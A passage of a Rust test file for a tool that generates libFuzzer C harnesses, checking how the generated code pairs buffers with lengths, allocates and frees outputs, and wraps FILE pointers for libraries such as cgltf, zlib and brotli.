            "typedef count must be paired, not fuzzed to INT_MAX, got:\n{main}",
        );
    }

    #[test]
    fn double_pointer_output_handle_in_parser_gets_null_scratch() {
        // cgltf_parse shape: `parse(const opts *o, const void *data, cgltf_size size,
        // result **out)`. The `result **` output handle (callee allocates and stores
        // at *out) must get a NULL scratch passed by address so the canonical
        // parse(data, size, T **out) entry harnesses at all — previously the `T **`
        // was rejected as not-drivable and the whole parser was skipped. `cgltf_size`
        // (a size_t typedef) must also be recognized so (data, size) pairs.
        let work = temp_dir("emit-dptr-handle");
        let header_source = r#"
            #include <stddef.h>
            typedef size_t cgltf_size;
            typedef struct opts { int flags; } opts;
            typedef struct result { int n; } result;
            int parse(const opts *o, const void *data, cgltf_size size, result **out);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CDPTR".to_owned(),
            output_dir: work.join("harness"),
            source_path: PathBuf::from("/tmp/p.c"),
            target: cfunction("parse"),
            params: vec![
                CParameter {
                    name: "o".to_owned(),
                    c_type: "const opts *".to_owned(),
                },
                CParameter {
                    name: "data".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "size".to_owned(),
                    c_type: "cgltf_size".to_owned(),
                },
                CParameter {
                    name: "out".to_owned(),
                    c_type: "result **".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/p.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
            result_cleanup: None,
        };
        let result_h = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result_h.main_c).unwrap();
        assert!(
            main.contains("data = (const void *)Data"),
            "data must borrow Data, got:\n{main}",
        );
        assert!(
            main.contains("size = (cgltf_size)Size"),
            "cgltf_size must pair to the actual length (Size), got:\n{main}",
        );
        assert!(
            main.contains("result * _gf_out_out = 0") && main.contains(", &_gf_out_out)"),
            "T** output handle must be a NULL scratch passed by address, got:\n{main}",
        );
    }

    #[test]
    fn parser_config_struct_is_zeroed_not_fuzzed() {
        // cgltf_parse shape: `parse(const cgltf_options *o, const void *data,
        // cgltf_size size)`. The options struct carries a `json_token_count` size
        // field that cgltf trusts as an allocation count; fabricating it from fuzz
        // bytes made cgltf allocate ~55 GB (CWE-789) before parsing a byte — a
        // harness artifact, not a target bug. Beside a (data, size) buffer the
        // config struct must be a zeroed default (library behaviour), NOT fuzzed.
        let work = temp_dir("emit-cfg-zero");
        let header_source = r#"
            #include <stddef.h>
            typedef size_t cgltf_size;
            typedef struct cgltf_options {
                int type;
                cgltf_size json_token_count;
            } cgltf_options;
            int parse(const cgltf_options *o, const void *data, cgltf_size size);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CCFG".to_owned(),
            output_dir: work.join("harness"),
            source_path: PathBuf::from("/tmp/p.c"),
            target: cfunction("parse"),
            params: vec![
                CParameter {
                    name: "o".to_owned(),
                    c_type: "const cgltf_options *".to_owned(),
                },
                CParameter {
                    name: "data".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "size".to_owned(),
                    c_type: "cgltf_size".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/p.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
            result_cleanup: None,
        };
        let result_h = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result_h.main_c).unwrap();
        assert!(
            main.contains("cgltf_options _gf_cfg_o; memset(&_gf_cfg_o, 0, sizeof _gf_cfg_o)"),
            "config struct must be a zeroed library default, got:\n{main}",
        );
        assert!(
            !main.contains("gf_bounded_length"),
            "config size field (json_token_count) must NOT be fuzzed, got:\n{main}",
        );
        assert!(
            main.contains("size = (cgltf_size)Size"),
            "the real (data, size) pair must still coalesce, got:\n{main}",
        );
    }

    #[test]
    fn out_handle_with_known_deallocator_is_freed_to_avoid_leak_on_valid_input() {
        // cgltf_parse shape with a known deallocator: the callee heap-allocates a
        // `result` and stores its pointer at `*out`. A delete-only lifecycle entry
        // (the CLI discovers `result_free` from the headers) means the harness must
        // free the handle after the call — otherwise every valid input that parses
        // successfully leaks the result, a CWE-401 false positive on the canonical
        // parser shape.
        let work = temp_dir("emit-out-handle-free");
        let header_source = r#"
            #include <stddef.h>
            typedef size_t cgltf_size;
            typedef struct result { int n; } result;
            int parse(const void *data, cgltf_size size, result **out);
            void result_free(result *r);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "result".to_owned(),
                init: None,
                delete: Some("result_free".to_owned()),
                init_returns_handle: false,
                init_args: vec![],
            }],
            drive_plan: None,
            harness_id: "H-COHF".to_owned(),
            output_dir: work.join("harness"),
            source_path: PathBuf::from("/tmp/p.c"),
            target: cfunction("parse"),
            params: vec![
                CParameter {
                    name: "data".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "size".to_owned(),
                    c_type: "cgltf_size".to_owned(),
                },
                CParameter {
                    name: "out".to_owned(),
                    c_type: "result **".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/p.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
            result_cleanup: None,
        };
        let result_h = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result_h.main_c).unwrap();
        assert!(
            main.contains("result * _gf_out_out = 0") && main.contains(", &_gf_out_out)"),
            "out-handle NULL scratch must still be emitted, got:\n{main}",
        );
        assert!(
            main.contains("if (_gf_out_out) result_free(_gf_out_out)"),
            "out-handle must be freed via the known deallocator, got:\n{main}",
        );
    }

    #[test]
    fn typed_array_count_pair_sizes_array_to_count_not_a_fabricated_singleton() {
        // jsmn_parse shape: `(<elem> *tokens, size_t num_tokens)`. Synthesising the
        // array pointer and the count INDEPENDENTLY handed the callee a 1-element
        // fabricated array with a huge fuzzed count, so it indexed far out of
        // bounds — a spurious heap/stack-buffer-overflow that was the ONLY
        // "finding" of hands-off libde265/cgltf runs. The pair must allocate
        // `count` elements so array and length agree. (`int *` element so the
        // registry resolves it to a non-byte scalar without a struct def.)
        let out = temp_dir("emit-typed-array");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C777".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/tok.c"),
            target: cfunction("tokenize"),
            params: vec![
                CParameter {
                    name: "tokens".to_owned(),
                    c_type: "int *".to_owned(),
                },
                CParameter {
                    name: "num_tokens".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/tok.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("calloc(") && main.contains("sizeof(*tokens)"),
            "array must be calloc'd to the count, got:\n{main}",
        );
        assert!(
            main.contains("(size_t)(tokens ? _gf_n_tokens : 0)"),
            "num_tokens must mirror the array length, not be independently fuzzed, got:\n{main}",
        );
        assert!(
            main.contains("free((void *)tokens)"),
            "the allocated array must be freed, got:\n{main}",
        );
    }

    #[test]
    fn reverse_count_typed_array_pair_preserves_order_and_shared_extent() {
        let defs =
            c_parser::parse_c_type_defs("typedef struct { int start; int end; } regmatch_t;")
                .unwrap();
        let registry = TypeRegistry::from_defs([&defs]);
        let params = vec![
            CParameter {
                name: "nmatch".to_owned(),
                c_type: "size_t".to_owned(),
            },
            CParameter {
                name: "pmatch".to_owned(),
                c_type: "regmatch_t *".to_owned(),
            },
        ];
        let emissions = build_param_decoders(
            &params,
            &registry,
            &[],
            None,
            false,
            false,
            DecoderLimits::default(),
            "regexec",
            false,
        )
        .expect("reverse typed-array pair");
        assert_eq!(emissions[0].arg, "nmatch");
        assert_eq!(emissions[1].arg, "pmatch");
        assert!(emissions[0].decl.contains("_gf_n_pmatch"));
        assert!(emissions[0].decl.contains("calloc"));
        assert!(emissions[0].decl.contains("nmatch ="));
        assert_eq!(emissions[1].free.as_deref(), Some("free((void *)pmatch)"));
    }

    #[test]
    fn in_memory_parser_uses_null_for_optional_url_and_encoding_metadata() {
        let params = vec![
            CParameter {
                name: "buffer".to_owned(),
                c_type: "const char *".to_owned(),
            },
            CParameter {
                name: "size".to_owned(),
                c_type: "int".to_owned(),
            },
            CParameter {
                name: "URL".to_owned(),
                c_type: "const char *".to_owned(),
            },
            CParameter {
                name: "encoding".to_owned(),
                c_type: "const char *".to_owned(),
            },
            CParameter {
                name: "options".to_owned(),
                c_type: "int".to_owned(),
            },
        ];
        let emissions = build_param_decoders(
            &params,
            &TypeRegistry::default(),
            &[],
            None,
            false,
            false,
            DecoderLimits::default(),
            "xmlReadMemory",
            false,
        )
        .expect("xmlReadMemory-shaped parser params");
        assert!(emissions[0].decl.contains("Data"));
        assert!(emissions[1].decl.contains("Size"));
        assert_eq!(emissions[2].decl, "const char * URL = NULL");
        assert_eq!(emissions[3].decl, "const char * encoding = NULL");
        assert_eq!(emissions[4].decl, "int options = 0");

        // Without a preceding memory buffer/length pair, the same names may be
        // required inputs and must remain ordinary decoded strings.
        let standalone = build_param_decoders(
            &params[2..4],
            &TypeRegistry::default(),
            &[],
            None,
            false,
            false,
            DecoderLimits::default(),
            "setEncoding",
            false,
        )
        .expect("standalone metadata params");
        assert!(standalone[0].decl.contains("gf_c_string"));
        assert!(standalone[1].decl.contains("gf_c_string"));
    }

    #[test]
    fn webp_interleaved_decode_derives_bounded_output_geometry() {
        let params = vec![
            CParameter {
                name: "data".to_owned(),
                c_type: "const uint8_t *".to_owned(),
            },
            CParameter {
                name: "data_size".to_owned(),
                c_type: "size_t".to_owned(),
            },
            CParameter {
                name: "output".to_owned(),
                c_type: "uint8_t *".to_owned(),
            },
            CParameter {
                name: "output_size".to_owned(),
                c_type: "size_t".to_owned(),
            },
            CParameter {
                name: "output_stride".to_owned(),
                c_type: "int".to_owned(),
            },
        ];
        let registry = TypeRegistry::default();
        let mut emissions = build_param_decoders(
            &params,
            &registry,
            &[],
            None,
            false,
            false,
            DecoderLimits::default(),
            "WebPDecodeRGBAInto",
            false,
        )
        .expect("WebP decode-into params");

        bind_webp_interleaved_output_geometry(
            "WebPDecodeRGBAInto",
            &params,
            &registry,
            &mut emissions,
        );
        assert!(emissions[2]
            .decl
            .contains("WebPGetInfo(data, data_size, &_gf_image_width, &_gf_image_height)"));
        assert!(emissions[2]
            .decl
            .contains("_gf_image_stride = (size_t)_gf_image_width * 4u"));
        assert!(emissions[2].decl.contains("(16u << 20)"));
        assert!(emissions[2].decl.contains("_gf_generic_capacity"));
        assert!(emissions[3].decl.contains("_gf_output_capacity"));
        assert!(emissions[4].decl.contains("_gf_image_geometry_valid ?"));
        assert!(emissions[4].decl.contains("gf_i32(&Cur)"));

        let mut planar = build_param_decoders(
            &params,
            &registry,
            &[],
            None,
            false,
            false,
            DecoderLimits::default(),
            "WebPDecodeYUVInto",
            false,
        )
        .expect("stand-in planar params");
        bind_webp_interleaved_output_geometry("WebPDecodeYUVInto", &params, &registry, &mut planar);
        assert!(!planar[2].decl.contains("WebPGetInfo"));
        assert!(planar[4].decl.contains("gf_i32"));
    }

    #[test]
    fn typed_pointer_with_non_count_neighbor_is_not_mis_paired_as_array() {
        // `(int *out, int flags)` — the second int is a bitmap, not a count, so the
        // typed-array pairing must NOT fire (no `_gf_n_out`); the params fall to the
        // standalone decoders.
        let out = temp_dir("emit-no-mispair");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C778".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/x.c"),
            target: cfunction("configure"),
            params: vec![
                CParameter {
                    name: "out".to_owned(),
                    c_type: "int *".to_owned(),
                },
                CParameter {
                    name: "flags".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/x.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            !main.contains("_gf_n_out"),
            "a non-count int neighbor must not trigger array pairing, got:\n{main}",
        );
    }

    #[test]
    fn non_const_output_buffer_pair_allocates_instead_of_aliasing_const_data() {
        // cwalk shape: `cwk_path_join(.., char *buffer, size_t buffer_size)`.
        // The non-const buffer must NOT alias libFuzzer's const `Data` — writing
        // to it aborts the run ("fuzz target overwrites its const input"). It
        // gets a writable, fuzz-seeded allocation that is freed.
        let out = temp_dir("emit-out-buf");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C00B".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/path.c"),
            target: cfunction("join"),
            params: vec![
                CParameter {
                    name: "buffer".to_owned(),
                    c_type: "char *".to_owned(),
                },
                CParameter {
                    name: "buffer_size".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "size_t".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/path.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();

        assert!(
            !main.contains("char * buffer = (char *)Data"),
            "non-const output buffer must not alias const Data:\n{main}",
        );
        assert!(
            main.contains("buffer = (char *)malloc"),
            "non-const output buffer should be heap-allocated:\n{main}",
        );
        assert!(
            main.contains("memcpy(buffer, Data, _gf_cap_buffer)"),
            "allocated buffer should be seeded with the fuzz bytes:\n{main}",
        );
        assert!(
            main.contains("buffer_size = (size_t)(buffer ? _gf_cap_buffer : 0)"),
            "the advertised length must be zero on allocation failure:\n{main}",
        );
        assert!(
            main.contains("free(buffer)"),
            "allocated buffer must be freed:\n{main}",
        );
    }

    #[test]
    fn buffer_with_non_length_neighbor_falls_back_to_individual_decoders() {
        let out = temp_dir("emit-no-pair");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C005".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/x.c"),
            target: cfunction("send"),
            params: vec![
                CParameter {
                    name: "msg".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "flags".to_owned(),
                    c_type: "uint32_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("gf_c_string(&Cur, 4096)"),
            "no length neighbor: buffer should use gf_c_string",
        );
        assert!(
            main.contains("free(msg)"),
            "non-paired heap buffer still needs free()",
        );
    }

    #[test]
    fn zlib_style_output_and_input_buffers_are_supported() {
        let out = temp_dir("emit-zlib-compress");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C006".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/compress.c"),
            target: cfunction("compress"),
            params: vec![
                CParameter {
                    name: "dest".to_owned(),
                    c_type: "Bytef *".to_owned(),
                },
                CParameter {
                    name: "destLen".to_owned(),
                    c_type: "uLongf *".to_owned(),
                },
                CParameter {
                    name: "source".to_owned(),
                    c_type: "const Bytef *".to_owned(),
                },
                CParameter {
                    name: "sourceLen".to_owned(),
                    c_type: "uLong".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["zlib.h".to_owned()],
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/compress.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();

        assert!(
            main.contains("Bytef * dest = (Bytef *)malloc"),
            "output byte buffer should be heap-allocated, got:\n{main}",
        );
        assert!(
            main.contains("uLongf _gf_out_destLen = (uLongf)(dest ? _gf_cap_dest : 0)"),
            "output length pointer should be initialized to buffer capacity, got:\n{main}",
        );
        assert!(
            main.contains("uLongf *destLen = &_gf_out_destLen"),
            "output length pointer should point at harness-owned storage, got:\n{main}",
        );
        assert!(
            main.contains("const Bytef * source = (const Bytef *)Data"),
            "input byte buffer should borrow libFuzzer Data, got:\n{main}",
        );
        assert!(
            main.contains("uLong sourceLen = (uLong)Size"),
            "input length should mirror libFuzzer Size, got:\n{main}",
        );
        assert!(
            main.contains("int R = compress(dest, destLen, source, sourceLen);"),
            "target call should pass the synthesized arguments, got:\n{main}",
        );
        assert!(
            main.contains("free(dest)"),
            "heap-allocated output buffer should be released, got:\n{main}",
        );
    }

    #[test]
    fn reverse_size_buffer_pairs_match_brotli_one_shot_contract() {
        let out = temp_dir("emit-brotli-decompress");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C-BROTLI".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/decode.c"),
            target: cfunction("BrotliDecoderDecompress"),
            params: vec![
                CParameter {
                    name: "encoded_size".to_owned(),
                    c_type: "size_t".to_owned(),
                },
                CParameter {
                    name: "encoded_buffer".to_owned(),
                    c_type: "const uint8_t *".to_owned(),
                },
                CParameter {
                    name: "decoded_size".to_owned(),
                    c_type: "size_t *".to_owned(),
                },
                CParameter {
                    name: "decoded_buffer".to_owned(),
                    c_type: "uint8_t *".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["brotli/decode.h".to_owned()],
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/decode.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("size_t encoded_size = (size_t)Size"),
            "reverse input length must cover the whole Data span:\n{main}"
        );
        assert!(
            main.contains("const uint8_t * encoded_buffer = (const uint8_t *)Data"),
            "reverse input pointer must borrow Data:\n{main}"
        );
        assert!(
            main.contains("size_t _gf_cap_decoded_buffer = 1024 * 1024"),
            "one-shot decompression needs a bounded expansion budget:\n{main}"
        );
        assert!(
            main.contains(
                "size_t _gf_out_decoded_size = (size_t)(decoded_buffer ? _gf_cap_decoded_buffer : 0)"
            ),
            "reverse output length must advertise the allocated capacity:\n{main}"
        );
        assert!(
            main.contains("BrotliDecoderDecompress(encoded_size, encoded_buffer, decoded_size, decoded_buffer)"),
            "argument order must remain the public API order:\n{main}"
        );
        assert!(main.contains("free(decoded_buffer)"), "{main}");
    }

    #[test]
    fn scalar_output_capacity_does_not_consume_input_buffer_pair() {
        let out = temp_dir("emit-output-capacity-and-input-pair");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CVOID-CAP".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/compress_mem.c"),
            target: cfunction("compress_mem_to_mem"),
            params: vec![
                CParameter {
                    name: "pOut_buf".to_owned(),
                    c_type: "void *".to_owned(),
                },
                CParameter {
                    name: "out_buf_len".to_owned(),
                    c_type: "size_t".to_owned(),
                },
                CParameter {
                    name: "pSrc_buf".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "src_buf_len".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "size_t".to_owned(),
            target_includes: vec!["compress_mem.h".to_owned()],
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/compress_mem.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();

        assert!(
            main.contains("void * pOut_buf = (void *)malloc"),
            "mutable output buffer with scalar capacity should be heap-allocated, got:\n{main}",
        );
        assert!(
            main.contains("size_t out_buf_len = (size_t)(pOut_buf ? _gf_cap_pOut_buf : 0)"),
            "output scalar capacity should mirror the heap buffer capacity, got:\n{main}",
        );
        assert!(
            main.contains("const void * pSrc_buf = (const void *)Data"),
            "input buffer should borrow libFuzzer Data, got:\n{main}",
        );
        assert!(
            main.contains("size_t src_buf_len = (size_t)Size"),
            "input length should mirror libFuzzer Size after output capacity pair, got:\n{main}",
        );
        assert!(
            !main.contains("size_t src_buf_len = gf_bounded_length"),
            "input length must not be decoded independently of Data, got:\n{main}",
        );
        assert!(
            main.contains("free(pOut_buf)"),
            "heap-allocated output buffer should be released, got:\n{main}",
        );
    }

    #[test]
    fn unnamed_read_buffer_capacity_stays_coupled_to_its_allocation() {
        let buffer = CParameter {
            name: "arg1".to_owned(),
            c_type: "void *".to_owned(),
        };
        let length = CParameter {
            name: "arg2".to_owned(),
            c_type: "size_t".to_owned(),
        };

        assert!(looks_like_output_capacity_pair(
            &buffer,
            &length,
            "archive_read_data"
        ));
        assert!(
            !looks_like_output_capacity_pair(&buffer, &length, "archive_write_data"),
            "an unnamed writable pointer on a write API is input, not output"
        );

        let (buffer_emission, length_emission) =
            pair_output_buffer_capacity(&buffer, &length, "archive_read_data");
        assert!(buffer_emission.decl.contains("size_t _gf_cap_arg1"));
        assert!(buffer_emission.decl.contains("malloc(_gf_cap_arg1"));
        assert_eq!(
            length_emission.decl,
            "size_t arg2 = (size_t)(arg1 ? _gf_cap_arg1 : 0)"
        );
    }

    #[test]
    fn buffer_length_pair_uses_registry_for_const_byte_typedefs() {
        let work = temp_dir("emit-byte-typedef-pair");
        let header_source = r#"
            #include <stddef.h>
            typedef unsigned char mz_uint8;
            unsigned long checksum(unsigned long crc, const mz_uint8 *ptr, size_t buf_len);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CBYTE-TYPEDEF".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/checksum.c"),
            target: cfunction("checksum"),
            params: vec![
                CParameter {
                    name: "crc".to_owned(),
                    c_type: "unsigned long".to_owned(),
                },
                CParameter {
                    name: "ptr".to_owned(),
                    c_type: "const mz_uint8 *".to_owned(),
                },
                CParameter {
                    name: "buf_len".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "unsigned long".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/checksum.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();

        assert!(
            main.contains("const mz_uint8 * ptr = (const mz_uint8 *)Data"),
            "const byte typedef pointer should borrow libFuzzer Data, got:\n{main}",
        );
        assert!(
            main.contains("size_t buf_len = (size_t)Size"),
            "typedef byte pointer length should mirror libFuzzer Size, got:\n{main}",
        );
        assert!(
            main.contains("unsigned long R = checksum(crc, ptr, buf_len);"),
            "target call should pass the borrowed pointer/length pair, got:\n{main}",
        );
        assert!(
            !main.contains("_gf_out_ptr"),
            "const input byte pointer must not be decoded as a scalar output pointer:\n{main}",
        );
    }

    #[test]
    fn generate_c_direct_harness_drives_file_pointer_with_fmemopen() {
        let work = temp_dir("emit-file-pointer");
        let header = work.join("target.h");
        let header_source = r#"
            #include <stdio.h>
            int parse_stream(FILE *stream);
        "#;
        fs::write(&header, header_source).unwrap();
        fs::write(
            work.join("jdmaster.h"),
            "struct jpeg_decomp_master; struct hostile_private { struct jpeg_decomp_master pub; };\n",
        )
        .unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CFILE".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("parse_stream"),
            params: vec![CParameter {
                name: "stream".to_owned(),
                c_type: "FILE *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("#define _GNU_SOURCE"));
        assert!(main.contains("#include <stdio.h>"));
        assert!(main.contains("fmemopen(_gf_file_buf_stream, Size, \"r+\")"));
        assert!(main.contains("if (stream) fclose(stream); free(_gf_file_buf_stream);"));
        assert!(main.contains("int R = parse_stream(stream);"));

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping generated C FILE* harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("file_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstdout:\n{}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn generate_c_direct_harness_drives_miniz_file_macro_pointer() {
        let work = temp_dir("emit-mz-file-pointer");
        let header = work.join("target.h");
        let header_source = r#"
            #include <stdio.h>
            #define MZ_FILE FILE
            int parse_cfile(MZ_FILE *stream);
        "#;
        fs::write(&header, header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CMZFILE".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("parse_cfile"),
            params: vec![CParameter {
                name: "stream".to_owned(),
                c_type: "MZ_FILE *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("#include <stdio.h>"));
        assert!(main.contains("#include \"target.h\""));
        assert!(
            main.contains("MZ_FILE * stream = (MZ_FILE *)(_gf_file_buf_stream ? (Size ? fmemopen")
        );
        assert!(main.contains("int R = parse_cfile(stream);"));
        assert!(main.contains("if (stream) fclose(stream); free(_gf_file_buf_stream);"));

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping generated C MZ_FILE* harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("mz_file_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
